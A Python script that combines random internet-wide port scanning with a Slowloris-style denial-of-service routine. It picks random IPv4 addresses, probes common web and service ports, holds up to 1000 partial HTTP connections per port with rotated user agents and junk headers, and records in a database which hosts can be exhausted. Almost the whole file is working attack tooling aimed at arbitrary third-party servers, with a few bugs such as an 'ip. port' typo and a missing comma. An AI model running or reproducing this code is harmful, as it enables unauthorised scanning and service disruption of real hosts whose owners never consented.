import socket
import random
import time
import sys
import ssl
import traceback
import _thread
import sqlite3
from os import system

listOfSockets = list()
ip = None
port = None
thread_kill = True
user_agents = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
]

# def create_openSSL():
# 	print('openSSL key and cert were created')
# 	system('openssl req -new -x509 -days 365 -nodes -out cert.pem -keyout cert.pem')
# 	for i in range(7):
# 		system(str(10+i))

conn = sqlite3.connect('db.db')
cursor = conn.cursor()
try:
	cursor.execute("""CREATE TABLE checked_ip
	                  (ip_address text, port text, maximum_connections text)
	               """)
	print('DB was created')
except:
	pass

conn.commit()

def portsCheck(ip):

	open_ports = []
	for port in [80, 443, 445, 5901, 8080, 8081]:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

		s.settimeout(0.1)
		try:
			s.connect((ip, port))
			open_ports.append(port)
		except:
			pass

		s.close()

	return open_ports



def socketInit(ip, port):

	global listOfSockets

	while True:
		if ip:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.settimeout(1)
			# time.sleep(0.1)
			s.connect((ip, port))
			break

		else:
			print('Please enter an IP address!')
			ip = input('IP: ')
			


	s.send('GET /?{} HTTP/1.1\r\n'.format(random.randint(0, 2000)).encode('utf-8'))
	header = 'User-Agent: {}\r\n'.format(random.choice(user_agents)).encode('utf-8')
	s.send(header)
	s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
	# print('{}. Socket port: {} IP: {}'.format(len(listOfSockets), port, ip))
	
	return s


def keeping_active(quantityOfSockets, ip, port):

	global listOfSockets
	global thread_kill

	print('Keeping active...')

	while True:

			if thread_kill:
				break
			try:
				for s in listOfSockets:
					try:
						s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
					except socket.error:
						listOfSockets.remove(s)
					except BrokenPipeError:
						print('creating a new socket')
						try:
							s = socketInit(ip. port)
							if s:
								listOfSockets.append(s)
						except:
							break
						continue

				time.sleep(0.5)

			except:
				break	



def connection(ip, port, quantityOfSockets=1000):
	
	global listOfSockets
	global thread_kill
	global cursor
	thread_kill = False
	thread = not thread_kill

	# if port == 443:
	# 	try:
	# 		f = open('cert.pem', 'r')
	# 		f.close()
	# 	except:
	# 		create_openSSL()



	for _ in range(quantityOfSockets):
		try:
			s = socketInit(ip, port)
			# if port == 443:
				# s = ssl.wrap_socket(s, 'cert.pem', 'cert.pem')

		except socket.timeout:
			break
		except BrokenPipeError:
			# print('Error with data: IP - {} Port - {} Socket Index - {}'.format(ip, port, len(listOfSockets)))
			# print('BrokenPipeError: perhaps server closed a port or something with a socket')
			continue
		except KeyboardInterrupt:
			for s in listOfSockets:
				s.close()
				listOfSockets.remove(s)
				break
		except:
			# print('Error with data: IP - {} Port - {} Socket Index - {}'.format(ip, port, len(listOfSockets)))
			# print(traceback.format_exc())
			continue

		listOfSockets.append(s)

		# if len(listOfSockets) > 100 and thread:
		# 	thr = _thread.start_new_thread(keeping_active, (quantityOfSockets, ip, port, ) )
		# 	thread = False

	thread_kill = True
	# time.sleep(0.1)

	result = len(listOfSockets)

	for s in listOfSockets:
		s.close()
		listOfSockets.remove(s)

	listOfSockets = []

	return result

def rand_ip():
	random_ip = '{}.{}.{}.{}'.format(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
	return random_ip

	


if __name__ == "__main__":

	# try:
	# 	ip = sys.argv[1]
	# except:
	# 	ip = input('IP: ')

	maximum_sockets = 1000
	print('Scaning...')
	counter = 0
	db_txt = open('db.txt', 'a+')

	while True:
		if counter == 0:
			db_txt.close()
			conn.commit()
			db_txt = open('db.txt', 'a+')

		try:
			ip = rand_ip()

			ports = portsCheck(ip)

			for port in ports:
				print('Scaning IP: {} Port: {}'.format(ip, port))
				count = connection(ip, port, maximum_sockets)
				print('End of {}:{} scanning'.format(ip, port))
				if count == maximum_sockets:
					count = '>'+str(count) 
				try:
					cursor.execute("INSERT INTO checked_ip (ip_address, port, maximum_connections) VALUES (?, ?, ?)", (ip, str(port), str(count)))
					db_txt.write('{} {} {}'.format(ip, port, count))
					print('IP - {}, Port - {}, Conn - {}'.format(ip, port, count))
					conn.commit()
				except:
					pass

		except KeyboardInterrupt:
			
			conn.commit()
			
			cursor.execute("SELECT * from checked_ip")
			results = cursor.fetchall()
			for i in results:
				ip, port, conn = i
				print('{} - {} - {}'.format(ip, port, conn))
			cursor.close()
			break
		except:
			print(traceback.format_exc())
			continue
		if counter != 10:
			counter += 1
		else:
			counter = 0



